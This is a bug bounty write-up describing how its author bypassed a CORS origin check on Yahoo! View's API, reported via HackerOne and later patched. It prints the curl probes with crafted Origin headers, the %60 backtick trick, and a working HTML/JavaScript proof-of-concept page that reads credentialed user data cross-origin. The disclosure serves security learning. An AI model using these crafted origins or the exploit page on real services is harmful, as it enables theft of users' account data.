# Tricky CORS Bypass in Yahoo! View

AuthorCORBEN LEO

Published2017.11.27

Recently, HackerOne hosted their second Hack The World competition. During this time I decided to take a look at Yahoo's bug bounty program because I have heard good things about them and also due to the fact that their scope is pretty big. After finding a few issues in my.yahoo.com and getting paid for those, I decided I was going to test [Yahoo! View](https://view.yahoo.com) I decided to browse a bit on`https://view.yahoo.com` and look at what requests were being made. After about 2 minutes of clicking literally everything I could click and submitting as many forms as I could, I decided to look through everything Burp Suite logged. I saw that the application making API calls to `https://api.view.yahoo.com` and thanks to Burp Suite's passive monitoring, I also noticed that the application implemented a cross-origin resource sharing (CORS) policy.According to the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS), CORS "is a mechanism that uses additional HTTP headers to let a user agent gain permission to access selected resources from a server on a different origin (domain) than the site currently in use." Since browsers enforce a Same-Origin Policy, which means that it only accepts ajax requests from accessing data from the same domain, Cross-Origin Resource Sharing allows sharing data with other sites that can be specified. The initial request I saw in Burp's history was:
  
  
  GET /api/session/preferences HTTP/1.1
  Host: api.view.yahoo.com
  ------- snip -------
  origin: https://view.yahoo.com

and the server's response was:
  
  
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8
  ------- snip -------
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: https://view.yahoo.com

Since the server was reflecting the origin and with `Access-Control-Allow-Credentials)` set to `true`, if I could get the origin to be allowed, then I could steal data from the API. First, I tried just sending a the origin `corben.io`:
  
  
  curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://corben.io'

The server responded without the Allow-Origin and Allow-Credentials.

Next, I tried sending `view.corben.io` as the origin:
  
  
  curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.corben.io'

Still nothing. An idea came to mind, what if I tried `view.yahoo.com.corben.io`?
  
  
  curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com.corben.io'

Voila! Still **DID NOT** respond with the Allow-Origin or ACAC. I had one more payload in mind: `view.yahoo.comcorben.io`. I sent it and to my dismay, nothing had changed. I was about to give up when I came up with the idea to send _two domains_ in the origin header:
  
  
  curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com corben.io'

To my surprise the server responded with:
  
  
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8
  ------- snip -------
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: https://view.yahoo.com corben.io

I was intrigued and was trying to come up with a way that I could make this a valid domain name so I could exploit it. I tried adding some characters to replace the space between the two domains to see what the server responded with!
  
  
  curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com%corben.io'

Response:
  
  
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8
  ------- snip -------
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: https://view.yahoo.com%corben.io

This still wasn't exploitable because it wasn't valid. After a bit of asking around, [Matt Austin](https://twitter.com/mattaustin) linked me to one of his [HackerOne Reports](https://hackerone.com/reports/255991) to Brave Software. I decided to try using a **URL-Encoded backtick** / %60 since I saw it would be a valid subdomain (from his report) and I already saw that the origin was reflected when there was a percent sign. I sent:
  
  
  curl -vv 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: https://view.yahoo.com%60cdl.corben.io'

The server's response:
  
  
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: http://view.yahoo.com%60cdl.corben.io

Yes, it worked! I set up a wildcard on one of my domains in Route53. I opened up Firefox and visited <http://view.yahoo.com%60cdl.hack-r.be> and it didn't load! Yay, more problems. I tried in Chrome, IE, & Edge and it didn't work in them either. I got to a Mac and tried it in **Safari** and it finally worked!! HOWEVER, Apache decided it didn't like the request and to keep throwing a server error.

![problems](/static/images/problems-meme.jpg)

After playing around I decided to just create a simple server in NodeJS to serve my exploit page.

Contents of **server.js** :
  
  
  const http = require("http");
  const port = 6299;
  const fs = require("fs");
  
  const requestHandler = (request, response) => {
  fs.readFile("index.html", function (err, data) {
  response.writeHead(200, { "Content-Type": "text/html" });
  response.write(data);
  response.end();
  });
  };
  
  const server = http.createServer(requestHandler);
  
  server.listen(port, (err) => {
  if (err) {
  return console.log("[+] ruh roh! something went wrong :(", err);
  }
  
  console.log(`[+] server is listening on port ${port}`);
  });

and
  
  
  <!DOCTYPE html>
  <html>
  <head><title>CORS</title></head>
  <body>
  <center>
  <h2>Yahoo CORs Exploit</h2>
  
  <textarea rows="10" cols="60" id="pwnz">
  </textarea>
  <button type="button" onclick="cors()">Exploit</button>
  </div>
  
  <script>
  function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
  document.getElementById("pwnz").innerHTML = this.responseText;
  }
  };
  xhttp.open("GET", "http://api.view.yahoo.com/api/session/preferences", true);
  xhttp.withCredentials = true;
  xhttp.send();
  }
  </script>

I ran it and tried loading the page again in Safari and it loaded perfectly. I clicked the "Exploit" button and it retrieved the data from the vulnerable API! woot woot!

Here's the proof of concept video:

## _Timeline_

  * (10/24/2017) Reported to Yahoo! via HackerOne

  * (10/27/2017) Confirmed & awarded $100 on Triage

  * (11/20/2017) Vulnerability Patched

  * (12/1/2017) Awarded $400 bounty & a $100 bonus for a "great writeup and POC"

Although it was a low impact bug, it was definitely a learning experience and a fun challenge!

Thanks for reading,
